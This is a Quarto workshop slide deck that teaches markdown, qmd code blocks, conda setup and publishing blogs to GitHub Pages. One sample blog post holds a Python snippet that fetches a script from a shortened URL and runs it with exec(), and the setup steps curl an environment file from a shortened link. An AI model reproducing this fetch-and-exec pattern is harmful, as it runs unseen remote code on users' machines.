
---
title: "Quarto Workshop"
author: "Ravi Kalia"
date: ""
format: 
  revealjs:
    slide-number: true
    embed-resources: true
    chalkboard: false
    theme: black
    transition: slide
    footer: "Quarto Workshop"
---

# Quality Quarto Quest!{.smaller}

::: {.columns}

::: {.column width="50%"}
::: {.fragment .fade-in}
<a href="https://static.wixstatic.com/media/1b4916_3bf27c6d0fbb463d8afdd5cd72867019~mv2.jpg">
    <img src="https://static.wixstatic.com/media/1b4916_3bf27c6d0fbb463d8afdd5cd72867019~mv2.jpg" alt="Click to enlarge" style="width: 70%; height: auto;">
</a>
:::
:::

::: {.column width="50%"}

Objective

Learn to create professional blogs, reports, and more with Quarto.

Please read excellent [Quarto Guide](https://quarto.org/docs/guide/).
:::

:::




## Prerequisites {.smaller}

### Tools
- GitHub account
- POSIX Compliant environment (not git bash, powershell or cygwin)
- VSCode installed
- Git Configured
- Conda installed

### Skills
- Creating conda environments
- Comfort with Git & GitHub
- Branching (GitHub Flow)
- Posts answers and links in chat


## What is Quarto?
**Quarto** is a modern, interactive publishing system built on [pandoc](https://pandoc.org/):

- Converts Markdown files to multiple formats:
  - html/rmarkdown/pdf
  - Reveal.js (slides, pptx)
  - Jupyter Notebooks (ipynb)
  - ePub, Typst, LaTex and more

origin: `org-mode` (Emacs) => `Sweave` / `knitr` => `RMarkdown` 

## Why Use Quarto?

- Focus on reproducibility
- Easy interactivity
- Flexible output formats
- Good processing of code blocks:
    * R
    * Python
    * Julia
    * ObservableJS


## Quarto Example Gallery

1. Open the [Quarto Examples Gallery](https://quarto.org/docs/gallery/).
2. Browse through the examples of:
   - Scientific reports
   - Data visualizations
   - Blogs
   - Interactive web apps

### Exercise
Identify one example to recreate during the workshop.



## Underlying Technology

Quarto: A transpiler that converts markdown to various formats. The foundational technologies are:

* Javascript (interactivity)
* HTML (markdown)
* CSS (fence divs)


## Installation

1. Install [Quarto](https://quarto.org/docs/get-started/) binary program 
2. Install the Quarto extension for VSCode:
   - Extensions > Search "Quarto" > Install
3. Command line install of quarto cli 

### Exercise
One, Two & Three.

WARNING: Quarto is under active development!

## Setting Up Your Environment{.smaller}

1. Create a new directory for the workshop:
   ```{.bash code-line-numbers="1|2"}
   mkdir -p ~/code/delete-me/quarto-play
   cd ~/code/delete-me/quarto-play
   ```

2. Create a Conda environment:
   ```{.bash code-line-numbers="1|2|3"}
   curl -L -o environment.yml https://shorturl.at/dZII6
   conda env create -f environment.yml -p "$PWD/.conda" 
   conda activate "$PWD/.conda"
   ```

3. Create .gitignore file:
   ```{.bash code-line-numbers="1|2"}
   curl -o .gitignore https://raw.githubusercontent.com/github/gitignore/main/Python.gitignore
   echo -e "\n# Custom ignores\n.conda/\n.env/" >> .gitignore
   ``` 

4. Initialize Git:
   ```{.bash code-line-numbers="1|2"}
   git init --initial-branch=main
   git switch -c basic-markdown
   ```

## Write Markdown 

1. Write a small `example.md` file:
   ```{.markdown code-line-numbers="1-3|4|5|6|7|8"}
   # Big Hello, Quarto!
   ## Smaller hello, quarto!
   ###### smallest hello, quarto!
   This is a demo of Markdown features:
   - **Bold text**
   - *Italic text*
   - [Links](https://quarto.org)
   - ![Image](https://picsum.photos/200/300)
   ```

### Exercise

Write some markdown in a file.

## Markdown Code Blocks{.smaller}

code blocks: formatted but not executed in markdown.


Python

   ```python
   def greet(name):
      print(f"Hello, {name}!")
   ```
R

   ```r
   greet <- function(name) {
      print(paste("Hello", name))
   }
   ```

Javascript

   ```javascript
   function greet(name) {
      console.log(`Hello, ${name}!`);
   }
   ```

### Exercise
Add code blocks to your markdown file.

## Convert Markdown

Transpile `example.md` using quarto:

   ```{.bash code-line-numbers="1|2|3"}
   quarto render example.md --to pdf
   quarto render example.md --to html
   quarto render example.md --to ipynb
   ```


### Exercise

Write and convert a markdown file to other format.
Commit changes


## Introducing qmd {.smaller}

Basic features:

* document metadata YAML format file header:

   ```yaml
   ---
   title: "blah"
   format: "html"
   date: "2025-01-22"
   ---
   ```

* `:::` fenced blocks are used for quarto & custom [`css`](https://web.dev/learn/css) divs and classes
  - `::: {.class}`
  - `::: {#id}`
  - `::: {.class #id}`



## Example qmd {.smaller}


1. new branch `git switch -c qmd-demo`

2. Write a small `example.qmd` file:
   ```{.markdown  code-line-numbers="1-4|5,7-8,9-10|6,11|6-11"}
   ---   
   title: "Demo"
   format: html
   ---
   # Hello, Quarto!
   ::: {.panel-tabset}
   ### Tab 1
   Content for tab 1.
   ### Tab 2
   Content for tab 2.
   :::
   ```

3. Render the file:
   ```bash
   quarto render example.qmd
   ```


### Exercise
Write a `.qmd` file with fenced blocks.


## Simple qmd Code Blocks{.smaller}

Quarto supports executing code blocks in markdown files.

Use curly braces `{}` to specify the execution language: {python}, {r}, {julia}.

Use curly braces with a period `{.}` to specify formatting options, no execution: {.python}, {.r}, {.julia}.

Python

```{python}
#| echo: true
def greet(name):
    print(f"Hello, {name}!")
greet("Quarto")
```

R

```{.r}
#| echo: true
#| warning: false
greet <- function(name) {
    print(paste("Hello", name))
}
greet("Quarto") 
```
"Quarto"

### Exercise  
Create a `.qmd` file with a Python and R code block.



## #| Code Blocks {.smaller}

The `#|` syntax adds control over code block execution & display.

   ```python
      #| echo: true
      #| warning: false
      def greet(name):
         print(f"Hello, {name}!")
   ```


| Option       | Description                                                                                          |
|--------------|------------------------------------------------------------------------------------------------------|
| `#|eval`     | Evaluate the code chunk.                                                                             |
| `#|echo`     | Include the source code in output.                                                                   |
| `#|output`   | Include the results of executing the code in the output (true, false, or asis).                      |
| `#|warning`  | Include warnings in the output.                                                                      |
| `#|error`    | Include errors in the output.                                                                        |
| `#|include`  | Catch all for preventing any output (code or results) from being included.                           |


### Exercise
Create a `.qmd` file with a Python code block using the `#|` options like `echo`, `warning`, and `eval`.

## Create a Blog Project {.smaller}

1. Create a Quarto blog project:
   ```bash
   quarto create project blog ~/code/delete-me/quarto-blog
   cd ~/code/delete-me/quarto-blog 
   ```

### Exercise

- Create a blog project & explain the directory structure.
- What is  `_quarto.yml`?
- What is `posts/` directory?
- What is  `style.css`?

## Create a Blog Conda Environment {.smaller}

1. Create a Conda environment:
   ```{.bash code-line-numbers="1|2|3"}
   curl -L -o environment.yml https://shorturl.at/dZII6
   conda env create -f environment.yml -p "$PWD/.conda" 
   conda activate "$PWD/.conda"
   ```

2. Create .gitignore file:
   ```{.bash code-line-numbers="1|2"}
   curl -o .gitignore https://raw.githubusercontent.com/github/gitignore/main/Python.gitignore
   echo -e "\n# Custom ignores\n.conda/\n.env/" >> .gitignore
   ``` 

3. Initialize Git:
   ```{.bash code-line-numbers="1|2"}
   git init --initial-branch=main
   git switch -c basic-markdown
   ```

### Exercise
Verify that the conda blog environment is active.


## Writing a Blog Post{.smaller}

Create a new `welcome.qmd` file in the `posts/` folder:

   ```markdown
   ---
   title: "My First Blog Post"
   date: 2025-01-20
   ---

   # Welcome!
   
   This is my first blog post using Quarto. Here's a dummy classifer on breast cancer data.
   
      ```{.python}
      import urllib.request

      gist_url = "https://shorturl.at/WZ8hR"

      try:
         with urllib.request.urlopen(gist_url) as response:
            script_content = response.read().decode('utf-8')
         
         print("Executing the script...")
         exec(script_content)  # Execute the script
      except Exception as e:
         print(f"An error occurred: {e}")
      ```
   ```

## Preview & Render Blog Post

The preview is a live preview of the blog post in the browser. The render command generates the output file.

1. Preview:
   ```bash
   quarto preview posts/welcome.qmd
   ```

2. Render:
   ```bash
   quarto render posts/welcome.qmd
   ```

## Using Jupyter To Blog

* Convert a jupyter notebook to a blogpost using quarto.
* Quarto first converts the notebook to qmd, and from there to the desired format.
* Just put YAML metadata at the top of the notebook in raw text format.
* Save the notebook in the `posts/` directory.

### Exercise

Write and convert a jupyter notebook to a blog post.

## Configure GitHub Pages

1. Configure `_quarto.yml`:
   
   ```yaml
   project:
     type: website
   publish:
     gh-pages:
       branch: gh-pages
   ```

2. Configure repo UI settings to publish from `gh-pages` branch

3. Push to GitHub:
   ```bash
   git add .
   git commit -m "Initial blog setup"
   git push origin blog-setup
   ```

4. Merge to `main` and deploy.


## Blog with RStudio{.smaller}

1. Run which R after conda activated environment
2. Open RStudio and go to Tools > Global Options.
3. Under the General tab, locate the "R version" section.
4. Click Change and then Browse.
5. Navigate to the R executable path you found in Step 2 and select it.
6. Open RStudio and create a new project.
7. Select Quarto Blog project type.
8. Create a new post and render it.
9. Push to GitHub.


## Group Exercise: Collaborative Blog

1. Form groups of 3–4 persons, have one person who is advanced in github flow.
2. Each group member creates a branch:
   ```bash
   git checkout -b member_initials/feature-branch-name
   ```
3. Write posts in the `posts/` directory.
4. Merge branches to `main`.
5. Push and share your blog URL.

## Recap

- **Quarto** combines flexibility and reproducibility.
- Create professional blogs, reports, and more.
- Practice collaborative workflows with GitHub.

### Next Steps
- Explore advanced Quarto features.
- Build your personal portfolio site!



## Questions?

